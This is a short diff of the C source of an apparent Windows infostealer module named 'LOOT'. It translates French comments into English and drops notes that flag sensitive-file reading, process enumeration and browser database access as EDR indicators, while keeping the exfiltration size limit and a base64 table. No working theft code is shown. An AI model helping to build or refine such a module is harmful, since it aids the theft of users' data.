@@ -4,21 +4,10 @@
 #include <tlhelp32.h>
 #include <shlobj.h>
 
-/**
- * Module LOOT - Implémentation
- *
- * NOTES DE SÉCURITÉ:
- * - Lecture de fichiers sensibles = comportement suspect
- * - Énumération de processus = IOC pour EDR
- * - Accès aux DB de navigateurs = TRÈS suspect
- */
-
-// Taille max d'un fichier à exfiltrer (1 MB)
+/* Maximum size of a file that can be exfiltrated (1 MB) */
 #define MAX_FILE_SIZE (1024 * 1024)
 
-/**
- * Table de conversion base64
- */
+/* Base64 character table */
 static const char base64_chars[] =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
